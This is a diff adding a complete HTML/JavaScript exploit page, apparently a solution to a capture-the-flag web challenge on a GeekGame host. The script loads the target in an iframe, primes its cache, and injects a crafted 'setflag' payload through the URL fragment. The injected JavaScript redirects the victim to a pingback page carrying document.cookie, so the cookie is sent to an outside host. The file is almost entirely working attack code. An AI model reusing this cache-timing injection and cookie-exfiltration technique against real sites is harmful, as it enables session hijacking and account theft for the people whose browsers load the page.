@@ -1,0 +1,61 @@
+<style>
+#frame {
+    width: 500px;
+    height: 300px;
+    /*display: none;*/
+}
+#msg {
+    font-size: 1.5em;
+    color: red;
+    font-weight: bold;
+}
+</style>
+<title>Running Exp</title>
+<iframe sandbox="allow-scripts allow-same-origin" id="frame"></iframe>
+<div id="msg">...</div>
+<script>
+let frame = document.getElementById('frame');
+let HOLE_URL = 'https://prob15-qkuhole.geekgame.pku.edu.cn/hole/';
+let PINGBACK_URL = new URL('pingback.html', location).href;
+
+async function sleep(ms) {
+    return new Promise((resolve)=>{
+        setTimeout(resolve,ms);
+    });
+}
+
+let exp_items = {
+    "switcher_2": {
+        "bar":[],
+        "dropdown":[],
+        "fix":{}
+    }
+}
+
+exp_items.switcher_2.fix = {
+    hole: 'location.href="' + PINGBACK_URL + '"+String.fromCharCode(63)+encodeURIComponent(document.cookie);',
+};
+
+async function exp() {
+    document.getElementById('msg').textContent = 'Running exp, wait a second...'
+    // set up cache
+    frame.src=HOLE_URL;
+    await sleep(1200);
+    frame.src=0;
+    await sleep(100);
+    // fire
+    let fire_url = HOLE_URL+'#'+encodeURIComponent('//setflag APPSWITCHER_ITEMS='+JSON.stringify(exp_items));
+    console.log(fire_url);
+    frame.src=fire_url;
+    await sleep(450); // less than 500ms so that it has no chance to fetch new switcher items
+    frame.src=0;
+    await sleep(100);
+    // get token
+    location.href=HOLE_URL;
+    //frame.src=HOLE_URL;
+    await sleep(450);
+    frame.src=0;
+}
+
+exp();
+</script>
